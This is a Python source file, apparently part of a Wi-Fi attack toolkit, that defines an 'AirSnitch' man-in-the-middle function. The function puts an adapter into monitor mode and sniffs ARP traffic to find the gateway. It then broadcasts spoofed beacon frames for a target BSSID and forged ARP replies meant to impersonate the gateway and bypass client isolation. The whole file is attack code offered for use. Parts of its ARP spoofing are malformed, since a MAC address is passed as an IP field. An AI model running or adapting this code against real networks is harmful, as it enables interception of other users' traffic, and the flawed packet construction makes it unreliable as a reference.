#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import random
import subprocess
import time
from utils.hardware import interface, monitor_interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.logger import log_capture
from utils.status import print_status


def airsnitch_attack(bssid: str, channel: str = "1", gateway_mac: str = None, session_id: str = None) -> bool:
    """
    AirSnitch MITM attack: impersonates gateway to bypass client isolation.
    Optionally discover gateway if not provided.
    """
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"AirSnitch MITM: {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    # Discover gateway if not given
    if not gateway_mac:
        capture_file = f"/tmp/airsnitch_capture_{session_id or ''}.pcap"
        tcpdump_cmd = ["timeout", "15", "tcpdump", "-i", mon_iface, "-w", capture_file, "arp"]
        subprocess.run(tcpdump_cmd, capture_output=True)
        try:
            packets = scapy.rdpcap(capture_file)
            for pkt in packets:
                if scapy.ARP in pkt and pkt[scapy.ARP].op == 2:
                    gateway_mac = pkt[scapy.Ether].src
                    break
        except:
            pass

    broadcast = "ff:ff:ff:ff:ff:ff"
    fake_mac = f"aa:bb:cc:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"

    for i in range(30):
        # Beacon frame
        beacon = scapy.RadioTap() / scapy.Dot11(
            type=0, subtype=8,
            addr1=broadcast,
            addr2=bssid,
            addr3=bssid
        ) / scapy.Dot11Beacon() / scapy.Dot11Elt(ID="SSID", info="")
        scapy.sendp(beacon, iface=mon_iface, count=1, inter=0.1)

        if gateway_mac:
            arp_response = scapy.Ether(dst=broadcast, src=fake_mac) / \
                          scapy.ARP(op=2, psrc=gateway_mac, hwsrc=fake_mac, pdst=broadcast)
            scapy.sendp(arp_response, iface=mon_iface, count=2, inter=0.05)

        time.sleep(0.1)

    log_capture("airsnitch", bssid, "", None)
    print_status("AirSnitch MITM delivered", "success")
    return True
